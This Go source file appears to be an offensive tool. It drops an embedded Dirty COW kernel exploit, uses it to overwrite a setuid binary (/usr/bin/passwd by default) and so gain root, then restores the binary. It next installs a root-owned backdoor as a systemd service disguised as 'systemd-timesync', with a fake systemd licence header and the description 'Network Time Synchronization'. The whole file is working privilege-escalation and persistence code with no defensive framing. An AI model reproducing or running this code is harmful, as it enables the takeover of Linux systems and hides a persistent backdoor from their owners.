package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const ServiceName = "systemd-timesync"

var (
	BackdoorPath        = filepath.Join("/lib", "systemd", ServiceName)
	BackdoorServicePath = filepath.Join("/lib", "systemd", "system", ServiceName+".service")
	BackdoorServiceFile = []byte(fmt.Sprintf(`#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.

[Unit]
Description=Network Time Synchronization
Documentation=man:systemd-timesyncd.service(8)
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart=%s
`, BackdoorPath))
)

func main() {
	path := flag.String("file", "/usr/bin/passwd", "File to pwn")
	flag.Parse()

	if *path == "" {
		flag.Usage()
		os.Exit(1)
	}

	orig, err := ioutil.ReadFile(*path)
	if err != nil {
		log.Fatalf("Failed to read original file: %s", err)
	}

	mkTemp := func() *os.File {
		f, err := ioutil.TempFile("", "systemd-private-")
		if err != nil {
			log.Fatalf("Failed to create temp file: %s", err)
		}
		return f
	}

	bkp := mkTemp()
	_, err = bkp.Write(orig)
	if err != nil {
		log.Fatalf("Failed to backup %s: %s", *path, err)
	}

	if err = bkp.Close(); err != nil {
		log.Fatalf("Failed to close backup file at %s: %s", bkp.Name(), err)
	}

	cow := mkTemp()
	_, err = cow.Write(DirtyCow)
	if err != nil {
		log.Fatalf("Failed write exploit to %s: %s", cow.Name(), err)
	}

	if err = cow.Chmod(0755); err != nil {
		log.Fatalf("Failed chmod 0755 %s: %s", cow.Name(), err)
	}

	if err = cow.Close(); err != nil {
		log.Fatalf("Failed to close %s", cow.Name())
	}

	out, err := exec.Command(cow.Name(), *path).CombinedOutput()
	if err != nil {
		log.Fatalf(`Failed to pwn %s: %s
Output: %s`, *path, err, string(out))
	}

	backdoorService := mkTemp()
	_, err = backdoorService.Write(BackdoorServiceFile)
	if err != nil {
		log.Fatalf("Failed write systemd service to %s: %s", backdoorService.Name(), err)
	}

	if err = backdoorService.Close(); err != nil {
		log.Fatalf("Failed to close %s", backdoorService.Name())
	}

	backdoor := mkTemp()
	_, err = backdoor.Write(Backdoor)
	if err != nil {
		log.Fatalf("Failed write backdoor to %s: %s", backdoor.Name(), err)
	}

	if err = backdoor.Close(); err != nil {
		log.Fatalf("Failed to close %s", backdoor.Name())
	}

	defer func() {
		for _, f := range []*os.File{
			cow, bkp, backdoorService, backdoor,
		} {
			if err = os.Remove(f.Name()); err != nil {
				log.Printf("Failed to remove %s: %s", f.Name(), err)
			}
		}
	}()

	cmd := exec.Command(*path)
	cmd.Stdin = func() io.Reader {
		ls := []string{}
		for _, l := range []struct {
			Format string
			Args   []interface{}
		}{
			{"echo 0 > /proc/sys/vm/dirty_writeback_centisecs", nil},
			{"cat %s > %s", []interface{}{bkp.Name(), *path}},
			{"mv %s %s", []interface{}{backdoorService.Name(), BackdoorServicePath}},
			{"chmod 0644 %s", []interface{}{BackdoorServicePath}},
			{"chown root:root %s", []interface{}{BackdoorServicePath}},
			{"mv %s %s", []interface{}{backdoor.Name(), BackdoorPath}},
			{"chmod 0755 %s", []interface{}{BackdoorPath}},
			{"chown root:root %s", []interface{}{BackdoorPath}},
			{"systemctl enable %s.service", []interface{}{ServiceName}},
			{"systemctl restart %s.service", []interface{}{ServiceName}},
		} {
			ls = append(ls, fmt.Sprintf(l.Format, l.Args...))
		}
		return bytes.NewBuffer([]byte(strings.Join(ls, "\n")))
	}()

	out, err = cmd.CombinedOutput()
	if err != nil {
		log.Fatalf(`Failed to infect machine: %s
Output: %s`, err, string(out))
	}
}
